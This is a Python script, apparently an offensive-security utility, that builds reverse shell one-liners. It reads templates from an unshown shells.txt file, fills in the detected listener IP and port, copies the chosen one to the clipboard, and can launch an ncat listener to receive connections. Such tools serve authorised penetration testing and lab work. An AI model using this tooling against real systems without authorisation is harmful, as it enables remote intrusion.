#!/usr/bin/env python3
'''\033[1;32m
                    _          _ _
 _ __ _____   _____| |__   ___| | |  _ __  _   _
| '__/ _ \ \ / / __| '_ \ / _ \ | | | '_ \| | | |
| | |  __/\ V /\__ \ | | |  __/ | |_| |_) | |_| |
|_|  \___| \_/ |___/_| |_|\___|_|_(_) .__/ \__, |
                                    |_|    |___/

 Website:\033[1;0m              github.com/c0llision/revshell \033[1;32m
 Author:\033[1;0m                                   c0llision \033[1;32m
====================================================\033[0m'''

from argparse import ArgumentParser
from pyperclip import copy as copy_clipboard
from subprocess import run, getoutput
import readline
import os
import sys


def is_valid_ip(address):
    octets = address.split('.')

    if len(octets) != 4:
        return False

    for octet in octets:
        try:
            octet = int(octet)
            if octet > 255 or octet < 0:
                return False
        except ValueError:
            return False

    return True


def start_nc():
    print("\n--------------------------")
    print("Running nc -lvnp {}".format(args.port))
    print("--------------------------")
    try:
        run("ncat -lvnp" +  str(args.port), shell=True)
    except KeyboardInterrupt:
        exit()


def copy_shell():
    try:
        clip_text = rev_shells[int(user_input) - 1].format(ip=args.ip,port=args.port)
        copy_clipboard(clip_text)
        print("Copied to clipboard: " + clip_text)
    except (IndexError, ValueError):
        pass


def get_args():
    ''' fetches CLI args '''
    parser = ArgumentParser(description='Generate reverse shell oneliners')
    parser.add_argument("-i", "--ip", default=get_ip(),
                        help='IP Address of listening machine')
    parser.add_argument("-p", "--port", default=4444,
                        help='Port to connect to')
    parser.add_argument("-php", "--php", action='store_true',
                        help='Create a php reverse shell')

    return parser.parse_args()


def print_help():
    print('help')


def get_ip(iface='tun0'):
    shell_cmd = 'ifconfig {} | grep -m1 "inet"| cut -d" " -f 10'

    for x in [iface, 'tap0', 'wlan0', 'eth0']:
        address = getoutput(shell_cmd.format(x))
        if is_valid_ip(address):
            break
    else:
        address = input("Enter IP address of listening machine: ")

    return address

def input_ip():
    args.ip = input("Enter IP address of listening machine: ")

if __name__=="__main__":
    # Get command line arguments
    args = get_args()

    # Print headers
    print(__doc__)
    print(" IP Address:             {}".format(args.ip))
    print(" Port:                   {}".format(args.port))
    print("\033[1;32m====================================================\033[1;0m")

    # Read in the one liners from the file
    filename = os.path.join(sys.path[0], 'shells.txt')
    with open(filename, 'r') as f:
        rev_shells = [ shell for shell in f.read().splitlines()
                if shell and not shell.startswith('#') ]

    # Print out the shells
    for i, shell in enumerate(rev_shells, 1):
        print("\n{}) ".format(i) + shell.format(
                                ip=args.ip,
                                port=args.port))

    # Let the user choose their shell
    print("\n\033[1;32m====================================================\033[1;0m")
    print ("\nChoose a shell: (h for help)\n")
    while True:
        user_input = input('> ').lower().strip()
        {
            'q': exit,
            'ip' :input_ip,
            'nc' :start_nc,
            'h': print_help
        }.get(user_input, copy_shell)()
